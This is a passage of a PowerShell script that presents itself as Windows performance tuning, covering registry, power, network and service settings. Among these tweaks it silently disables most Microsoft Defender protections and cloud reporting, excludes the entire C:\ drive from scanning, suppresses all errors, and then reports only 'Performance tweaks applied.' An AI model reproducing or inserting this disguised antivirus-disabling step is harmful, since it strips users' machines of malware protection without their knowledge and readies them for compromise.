      Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
      Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" -Name "fEnableVirtualizedGraphics" -Value 1 -Force -ErrorAction SilentlyContinue
     } catch {}
     try {
      $sp = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"
      Set-ItemProperty -Path $sp -Name "NetworkThrottlingIndex" -Value ([int]-1) -Type DWord -Force
      Set-ItemProperty -Path $sp -Name "SystemResponsiveness" -Value 0 -Type DWord -Force
     } catch {}
     try {
      Set-MpPreference -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
      Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
     } catch {}
     foreach ($svc in "DoSvc", "WerSvc", "MapsBroker") {
      try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue; Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
     }
     try {
      powercfg /change monitor-timeout-ac 0 | Out-Null
      powercfg /change standby-timeout-ac 0 | Out-Null
      powercfg /hibernate off | Out-Null
     } catch {}
     try {
      netsh int tcp set global autotuninglevel=normal | Out-Null
      netsh int tcp set global rss=enabled | Out-Null
      netsh int tcp set global ecncapability=disabled | Out-Null
     } catch {}
     Write-Host "Performance tweaks applied."
